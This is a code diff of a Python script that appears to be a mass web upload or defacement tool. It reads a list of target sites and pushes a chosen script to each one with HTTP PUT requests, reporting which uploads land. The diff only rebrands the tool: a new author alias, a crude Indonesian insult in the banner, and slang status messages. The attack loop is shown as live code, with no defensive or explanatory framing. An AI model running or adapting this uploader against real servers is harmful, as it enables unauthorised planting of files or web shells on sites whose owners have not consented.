@@ -10,8 +10,8 @@ except ImportError:
 banner = """
 
 Github : ---
-Author Ver AOX /official: $demonX
-aku getegeh #$demonX HENSOM
+Author :C0P3T.B3RCL4SS
+kuntul anda bolong bosss
 
 
 
@@ -43,9 +43,9 @@ def aox(script,target_file="target.txt"):
                site = "http://" + site
             req = s.put(site+"/"+script,data=op)
             if req.status_code < 200 or req.status_code >= 250:
-               print(m+"["+b+"FAILED!"+m+" ] %s/%s"%(site,script))
+               print(m+"["+b+"ZONK!!"+m+" ] %s/%s"%(site,script))
             else:
-               print(m+"["+h+"SUCCESS"+m+" ] %s/%s"%(site,script))
+               print(m+"["+h+"BERUNTUNG!!"+m+" ] %s/%s"%(site,script))
 
          except requests.exceptions.RequestException:
             continue
@@ -56,7 +56,7 @@ def main(__bn__):
    print(__bn__)
    while True:
       try:
-         a = x("Nama script lu: ")
+         a = x("Nama script lu boss: ")
          if not os.path.isfile(a):
             print("file '%s' not found"%(a))
             continue
